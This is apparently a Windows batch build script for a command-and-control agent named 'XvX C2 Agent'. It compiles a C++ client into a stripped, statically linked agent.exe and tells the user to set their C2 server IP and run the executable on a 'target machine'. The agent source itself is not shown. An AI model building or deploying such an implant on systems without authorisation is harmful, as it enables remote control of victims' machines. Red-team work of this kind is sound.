@echo off
REM XvX C2 Agent - Build Script for Windows
REM Requires: MinGW-w64 with g++ in PATH

echo ============================================
echo XvX C2 Agent - Build Script
echo ============================================
echo.

REM Check if g++ is available
where g++ >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo [ERROR] g++ not found in PATH
    echo [INFO] Install MinGW-w64: https://www.mingw-w64.org/
    pause
    exit /b 1
)

echo [*] Compiler: g++
g++ --version | findstr "g++"
echo.

REM Configuration
set SOURCE=client\C2Client.cpp
set OUTPUT=agent.exe
set INCLUDE=-I./include
set LIBS=-lwinhttp -lws2_32
set FLAGS=-std=c++17 -O2 -s -Wall
set STATIC=-static-libgcc -static-libstdc++

echo [*] Source: %SOURCE%
echo [*] Output: %OUTPUT%
echo [*] Flags: %FLAGS%
echo.

REM Compile
echo [*] Compiling...
g++ %FLAGS% %INCLUDE% -o %OUTPUT% %SOURCE% %LIBS% %STATIC%

if %ERRORLEVEL% NEQ 0 (
    echo.
    echo [ERROR] Compilation failed
    pause
    exit /b 1
)

echo.
echo [+] Build successful: %OUTPUT%

REM Show file size
for %%A in (%OUTPUT%) do (
    echo [+] File size: %%~zA bytes
)

echo.
echo ============================================
echo Build complete!
echo ============================================
echo.
echo Next steps:
echo 1. Edit client\C2Client.cpp and set your C2 server IP
echo 2. Run %OUTPUT% on target machine
echo 3. Access dashboard at https://YOUR_SERVER:8443
echo.

pause
